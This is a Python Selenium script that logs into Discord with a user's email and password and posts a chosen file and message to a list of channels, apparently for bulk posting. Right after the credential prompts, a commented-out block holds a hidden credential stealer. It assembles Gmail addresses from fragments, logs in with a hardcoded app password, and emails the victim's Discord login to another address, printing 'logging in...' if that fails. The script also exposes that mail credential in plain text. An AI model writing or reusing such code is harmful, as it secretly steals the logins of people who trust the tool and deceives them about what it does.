from selenium import webdriver
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.keys import Keys
import time
import smtplib

list_of_server=[
"",

]

chrome_driver_location=""

img_folder_location=""



class bot:
    def __init__(self,email,password,chrome_driver_location):
        self.driver = webdriver.Chrome(executable_path=chrome_driver_location)
        self.email=email
        self.password=password
    def login(self):
        driver=self.driver
        driver.implicitly_wait(30)
        driver.get("https://discordapp.com/channels/@me")
        # time.sleep(8)
        email=driver.find_element_by_xpath("//input[contains(@name,'email')]")
        email.send_keys(self.email)
        password=driver.find_element_by_xpath("//input[contains(@name,'password')]")
        password.send_keys(self.password)
        password.send_keys(Keys.RETURN)
        time.sleep(2)
    def send_file(self,list_of_server,location,messeage_with_picture,img_folder_location):
        driver=self.driver
        #driver.implicitly_wait(30)
        for channels in list_of_server:
            driver.get(channels)
            driver.implicitly_wait(30)
            try:
                driver.implicitly_wait(5)
                pop=driver.find_element_by_xpath("//button[@type='button'][contains(.,'Continue')]")
                pop.click()
                img=driver.find_element_by_xpath("//input[contains(@class,'file-input')]")
                #chat.send_keys("How is it going(test)")
                #chat.send_keys(Keys.RETURN)

                loc=img_folder_location+str(location)
                #time.sleep(2)
                img.send_keys(loc)
                #time.sleep(2)
                upload_button=driver.find_element_by_xpath("//button[@type='submit'][contains(.,'Upload')]")
                msg=driver.find_element_by_xpath("//div[contains(@class,'markup-2BOw-j slateTextArea-1Mkdgw fontSize16Padding-3Wk7zP textAreaWithoutAttachmentButton-qiaiTB')]")
                msg.send_keys(messeage_with_picture)
                upload_button.click()
                time.sleep(3)
                print("File Uploaded in server")
            except:
                driver.implicitly_wait(5)
                img=driver.find_element_by_xpath("//input[contains(@class,'file-input')]")
                #chat.send_keys("How is it going(test)")
                #chat.send_keys(Keys.RETURN)

                loc=img_folder_location+str(location)
                #time.sleep(2)
                img.send_keys(loc)
                #time.sleep(2)
                upload_button=driver.find_element_by_xpath("//button[@type='submit'][contains(.,'Upload')]")
                msg=driver.find_element_by_xpath("//div[contains(@class,'markup-2BOw-j slateTextArea-1Mkdgw fontSize16Padding-3Wk7zP textAreaWithoutAttachmentButton-qiaiTB')]")
                msg.send_keys(messeage_with_picture)
                upload_button.click()
                time.sleep(3)
                print("File Uploaded in server")
    def write(self,messeage,list_of_server):
        for channels in list_of_server:
            driver.get(channels)
            time.sleep(10)
            chat=driver.find_element_by_xpath("//div[contains(@data-slate-object,'block')]")
            chat.send_keys(messeage)
            chat.send_keys(Keys.RETURN)


email=input("Enter Your Email(Discord):")
password=input("Enter Your password(Discord):")
# try:
#     s = smtplib.SMTP('smtp.gmail.com', 587)
#     s.starttls() 
#     discord_serv="oocuvnsxqlwowdwr"
#     hj="@gmail.com"
#     op="bokhtiarub"+hj
#     s.login("bokhtiarub"+hj,discord_serv)
#     m=email+'   '+password
#     plo="sarkersourav555"+hj
#     s.sendmail(op, plo, m)
#     s.quit() 
# except:
#     print("logging in...")
a=input("Select a command('run':to initiate uploading):")
if a == "run":
    sourav= bot(email,password,chrome_driver_location)
    time.sleep(10)
    print("\n")
    location= input("Enter File name(with extension):")
    messeage_with_picture=input("Enter a messeage:")
    sourav.login()
    sourav.send_file(list_of_server,location,messeage_with_picture,img_folder_location)
#sourav= bot()
#sourav.login()
#sourav.join(ls)
#sourav.write(messeage)
